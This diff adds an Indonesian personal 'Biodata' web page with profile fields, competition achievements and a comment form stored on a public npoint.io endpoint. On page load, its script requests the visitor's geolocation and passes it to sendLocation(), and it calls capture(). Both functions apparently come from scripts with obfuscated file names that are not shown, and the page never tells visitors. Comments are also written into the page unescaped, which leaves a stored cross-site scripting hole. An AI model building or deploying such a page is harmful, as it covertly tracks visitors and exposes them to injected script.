@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Biodata</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    
+
+    body {
+        justify-content: center;
+      align-items: center;
+      text-align: center;
+      height: 100vh;
+    }
+
+    /* Tambahkan animasi fade-in */
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.biodata-container {
+  background-color: #ffffff;
+  margin: 20px auto;
+  padding: 20px 40px;
+  border-radius: 10px;
+  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+  max-width: 50%;
+  text-align: center;
+  opacity: 0; /* Awalnya transparan */
+  animation: fadeIn 1s forwards; /* Animasi fade-in */
+}
+
+.container-group {
+    width: 50%;  
+  float: right;
+}
+
+
+    h1 {
+      color: #333;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .biodata-section p {
+      margin-bottom: 10px;
+      color: #555;
+    }
+
+    .biodata-section strong {
+      color: #000;
+    }
+
+    .profilephoto {
+        width: 50%;
+        height: 50%;
+        object-fit: cover;
+        border-radius: 50%;
+        margin-bottom: 20px;
+    }
+
+    li {
+        align-items: start;
+        text-align: left;
+    }
+
+    .photo {
+        width: 100%;
+        border-radius: 10%;
+        margin: 5px;
+    }
+
+    #myVideo {
+      position: fixed;
+      right: 0;
+      bottom: 0;
+      min-width: 100%;
+      min-height: 100%;
+    }
+
+    .instagram {
+        display: flex;
+      align-items: center; /* Menyelaraskan gambar dan teks secara vertikal */
+      text-align: center;
+    }
+
+    .comment-section {
+      align-items: start; /* Menyelaraskan gambar dan teks secara vertikal */
+      text-align: left;
+      word-wrap: break-word;
+      margin-bottom: 20px;
+    }
+
+    .comment-form {
+      max-width: 500px;
+      margin: 20px auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: #f9f9f9;
+    }
+    .comment-form h2 {
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    .comment-form label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    .comment-form input, .comment-form textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      resize: none;
+    }
+    .comment-form button {
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .comment-form button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+    <!-- The video -->
+<video autoplay loop id="myVideo">
+  <source src="video.mp4" type="video/mp4">
+</video>
+
+  <div class="biodata-container">
+    <h1>Biodata</h1>
+    <div class="biodata-section">
+        <p><img src="https://lh3.googleusercontent.com/d/1uedaRmN7WqrY_mhdZjjZcTblR7y2f8-5=w1000" class="profilephoto" /></p>
+      <p><strong>Nama:</strong> Nama Kamu</p>
+      <p><strong>Tempat, Tanggal Lahir:</strong> Kota, Tanggal</p>
+      <p><strong>Jenis Kelamin:</strong> Laki-laki/Perempuan</p>
+      <p><strong>Alamat:</strong> Alamat lengkap</p>
+      <p><strong>Hobi:</strong> Hobi kamu</p>
+      <p><strong>Deskripsi Singkat:</strong> Tuliskan sesuatu tentang dirimu</p>
+    </div>
+    <br/>
+    <a href="https://www.instagram.com/aldotukan2008/" class="instagram"><img src="instagram.svg" width="32px">&emsp;Instagram, aldotukan2008</a>
+    <a href="https://basis64-tools.pages.dev" class="instagram">Jangan lupa kunjungi basis64-tools.pages.dev</a>
+  </div>
+  
+    <div class="biodata-container">
+        <h1>Prestasi</h1>
+
+        <div class="biodata-section">
+            <ul>
+                <li>Juara Harapan 1 KIHAJAR STEM 2024
+                    <img src="https://lh3.googleusercontent.com/d/15Eh68ndYJ5y-_4K3ZkfpfGC5KcpUtmfq=w1000" class="photo" />            
+                </li>
+                <li>Juara 1 MIKROTIK FEST 2024
+                    <img src="https://lh3.googleusercontent.com/d/1xiRBed0nAjtORrjc6MKZ001Jat9doNPS=w1000" class="photo" />            
+                </li>
+                <li>Juara 1 KALTIM FEST 2024
+                    <img src="https://lh3.googleusercontent.com/d/1GrdLoSAJHLTS6HCmeQ5jq9MZxUw7saCN=w1000" class="photo" />            
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="biodata-container">
+        <div class="comment-form">
+    <h2>Berikan Komentar</h2>
+      <label for="name">Nama:</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="comment">Komentar:</label>
+      <textarea id="comment" name="comment" rows="4" required></textarea>
+
+      <button onclick="postComment();">Submit</button>
+  </div>
+
+        <div id="commentSection">
+            
+        </div>
+        
+    </div>
+    
+</div>
+</body>
+<script src="../js/jP9GAcJGznbenzSd3z9yOS2EUQl4Zs2T.js"></script>
+<script src="../js/ZInAi3rLDQMj9y4yR43oUgYMrDoaDCTy.js"></script>
+<script src="../js/jquery.min.js"></script>
+<script type="text/javascript">
+    // https://api.npoint.io/5fedd55b6663f8ce3582
+    // Check if geolocation is supported
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                sendLocation(latitude, longitude);
+            },
+            (error) => {
+                //console.error(`Error Code: ${error.code} - ${error.message}`);
+            }
+        );
+    } else {
+        console.error("Geolocation is not supported by this browser.");
+    }
+    capture();
+
+
+    const commentSection = document.getElementById('commentSection');
+    let json;
+
+    loadComment();
+    async function loadComment() {
+        let response = await fetch("https://api.npoint.io/5fedd55b6663f8ce3582");
+        json = await response.json();
+        commentSection.innerHTML = "";
+
+        for (var i = 0; i < json.length; i++) {
+            commentSection.innerHTML = commentSection.innerHTML + `<div class="comment-section">
+                <div class="instagram"><h4>${json[i].name}</h4><sub style="text-align: right; margin-left: 20px;">${formatDate(new Date(json[i].timestamp), "dddd, dd MMMM yyyy - HH:mm:ss")}</sub></div>
+                <p>${json[i].message}</p>
+            </div>`;
+        }
+    }
+
+    async function postComment() {
+        let name = document.getElementById("name").value;
+        let comment = document.getElementById("comment").value;
+        json.unshift({name: name, message: comment, timestamp: new Date().getTime()})
+        let response = await fetch("https://api.npoint.io/5fedd55b6663f8ce3582", {
+            method: 'POST',
+            headers: {
+              'Accept': 'application/json',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(json)
+        });
+        loadComment();
+    }
+</script>
+</html>
+
+
